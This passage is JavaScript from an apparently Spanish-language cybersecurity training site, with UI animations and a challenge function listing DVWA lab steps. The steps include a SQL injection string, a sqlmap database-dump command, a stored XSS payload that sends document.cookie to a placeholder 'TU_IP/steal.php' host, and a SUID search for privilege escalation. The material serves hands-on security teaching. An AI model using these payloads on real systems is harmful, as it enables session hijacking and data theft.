                block.classList.toggle('expanded');
            });
        }
    });
}

// ========================================
// Theme
// ========================================
function toggleTheme() {
    const body = document.body;
    const icon = document.querySelector('#themeToggle i');
    
    if (body.getAttribute('data-theme') === 'dark') {
        body.setAttribute('data-theme', 'light');
        icon.className = 'fas fa-sun';
    } else {
        body.setAttribute('data-theme', 'dark');
        icon.className = 'fas fa-moon';
    }
}

// ========================================
// Terminal Animation
// ========================================
const terminalCommands = [
    { cmd: 'nmap -sV target.com', output: 'Starting Nmap scan...\nPORT    STATE SERVICE\n80/tcp  open  http\n443/tcp open  https\n22/tcp  open  ssh' },
    { cmd: 'python3 recon.py -d ejemplo.com', output: '[+] Resolving domain...\n[+] 5 subdomains found\n[+] Scan complete!' },
    { cmd: 'docker compose up -d', output: 'Creating network...\nCreating container...\n✓ All services started' },
    { cmd: 'prowler aws --checks iam', output: '[PASS] IAM policies\n[CRIT] Root account without MFA\n[HIGH] Access keys older than 90 days' },
];

let cmdIndex = 0;
let charIndex = 0;
let isTyping = false;

function typeTerminal() {
    if (isTyping) return;
    
    const commandEl = document.getElementById('terminalCommand');
    const outputEl = document.getElementById('terminalOutput');
    
    if (!commandEl || !outputEl) return;
    
    isTyping = true;
    const current = terminalCommands[cmdIndex];
    
    // Type command
    const typeChar = () => {
        if (charIndex < current.cmd.length) {
            commandEl.textContent += current.cmd[charIndex];
            charIndex++;
            setTimeout(typeChar, 50 + Math.random() * 50);
        } else {
            // Show output
            setTimeout(() => {
                outputEl.innerHTML = `<pre>${current.output}</pre>`;
                
                // Next command
                setTimeout(() => {
                    commandEl.textContent = '';
                    outputEl.innerHTML = '';
                    charIndex = 0;
                    cmdIndex = (cmdIndex + 1) % terminalCommands.length;
                    isTyping = false;
                    typeTerminal();
                }, 3000);
            }, 500);
        }
    };
    
    typeChar();
}

// ========================================
// Counter Animation
// ========================================
function animateCounters() {
    const counters = document.querySelectorAll('.stat-number[data-target]');
    
    counters.forEach(counter => {
        const target = parseInt(counter.getAttribute('data-target'));
        const duration = 2000;
        const increment = target / (duration / 16);
        let current = 0;
        
        const update = () => {
            current += increment;
            if (current < target) {
                counter.textContent = Math.floor(current);
                requestAnimationFrame(update);
            } else {
                counter.textContent = target;
            }
        };
        
        update();
    });
}

// ========================================
// Challenge Filter
// ========================================
function initChallengeFilter() {
    const filterBtns = document.querySelectorAll('.challenges-filter .filter-btn');
    const challengeCards = document.querySelectorAll('.challenge-card');
    
    filterBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            filterBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            
            const filter = btn.getAttribute('data-filter');
            
            challengeCards.forEach(card => {
                const difficulty = card.getAttribute('data-difficulty');
                if (filter === 'all' || difficulty === filter) {
                    card.style.display = 'block';
                    card.style.animation = 'fadeIn 0.3s ease';
                } else {
                    card.style.display = 'none';
                }
            });
        });
    });
}

// ========================================
// Challenge Start (placeholder)
// ========================================
function startChallenge(type) {
    const challenges = {
        sqli: {
            title: 'SQL Injection Básico',
            steps: [
                'Ve a http://localhost:8080/dvwa/',
                'Login: admin / password',
                'Ve a SQL Injection',
                'Prueba con: 1\' OR \'1\'=\'1',
                'Observa cómo se muestra toda la tabla',
                'Usa SQLMap para automatizar: sqlmap -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx" --dbs'
            ]
        },
        xss: {
            title: 'XSS Stored',
            steps: [
                'Ve a http://localhost:8080/dvwa/',
                'Login: admin / password',
                'Ve a Stored XSS',
                'Escribe: <script>alert("XSS")</script>',
                'Observa la alerta',
                'Prueba: <script>document.location="http://TU_IP/steal.php?c="+document.cookie</script>'
            ]
        },
        privesc: {
            title: 'Privilege Escalation',
            steps: [
                'Conéctate al sistema vulnerable',
                'Ejecuta: sudo -l (ver permisos)',
                'Busca SUID: find / -perm -4000 2>/dev/null',
                'Analiza binarios SUID sospechosos',
                'Explota la configuración insegura',
                'Obtén acceso root'
            ]
        }
    };
    
    const challenge = challenges[type];
    if (challenge) {
        alert(`${challenge.title}\n\nPasos:\n${challenge.steps.map((s, i) => `${i+1}. ${s}`).join('\n')}`);
    }
}

// ========================================
// Initialize
// ========================================
document.addEventListener('DOMContentLoaded', () => {
    initNavigation();
    animateCounters();
    initChallengeFilter();
    
    // Start terminal animation
    setTimeout(typeTerminal, 1000);
    
    console.log('🛡️ CyberDefense Pro Network - Interactive Platform Loaded');
});
